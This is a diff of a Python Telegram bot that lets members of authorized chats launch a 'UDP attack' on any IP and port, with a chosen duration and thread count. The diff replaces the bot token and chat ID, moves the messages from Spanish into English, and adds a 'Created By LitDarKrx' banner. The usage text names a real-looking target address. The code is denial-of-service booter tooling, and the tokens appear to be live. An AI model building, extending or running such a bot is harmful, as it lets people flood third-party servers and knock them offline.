@@ -3,23 +3,23 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 import subprocess
 
 # Token del bot (obtén el token de @BotFather en Telegram)
-TOKEN = "8019097232:AAGNUqNSWL_mUVCCupNZR6dd5ckOdzGmsT0"
+TOKEN = "7852580657:AAEXo_cAGjiCO3NW6SSGHMrod0K3nfpE7WQ"
 
 # Lista de chats autorizados
-allowed_chats = ['-1002392775903']  # Reemplaza con los IDs de los chats autorizados
+allowed_chats = ['-1002362295139']  # Reemplaza con los IDs de los chats autorizados
 
 # Comando para iniciar un ataque UDP
 async def udp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Verifica si el ID del chat está autorizado
     chat_id = str(update.message.chat_id)
     if chat_id not in allowed_chats:
-        await update.message.reply_text("Este chat no está autorizado para usar este comando.")
+        await update.message.reply_text("⚠️  This Chata is not authorized to use this command ⚠️")
         return
 
     # Verifica que el usuario haya ingresado los parámetros necesarios
     if len(context.args) < 3:
         await update.message.reply_text(
-            "Uso: /udp <IP:Puerto> <Duración> <Threads>\nEjemplo: /udp 143.92.114.176:10015 53 999"
+            "👑 Created By LitDarKrx 👑\n\n⚙️Example: /attack <IP:PORT> <Duration> <Threads>\✅ Send To Activate: /attack 143.92.114.176:10015 53 999 "
         )
         return
 
@@ -38,7 +38,7 @@ async def udp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"Simulación UDP iniciada:\n- Target: {target}\n- Duración: {duration} segundos\n- Threads: {threads}"
         )
     except Exception as e:
-        await update.message.reply_text(f"Error al ejecutar el comando:\n{str(e)}")
+        await update.message.reply_text(f"⚠️ Error Executing Command:\n{str(e)} ⚠️")
 
 # Configuración principal del bot
 def main():
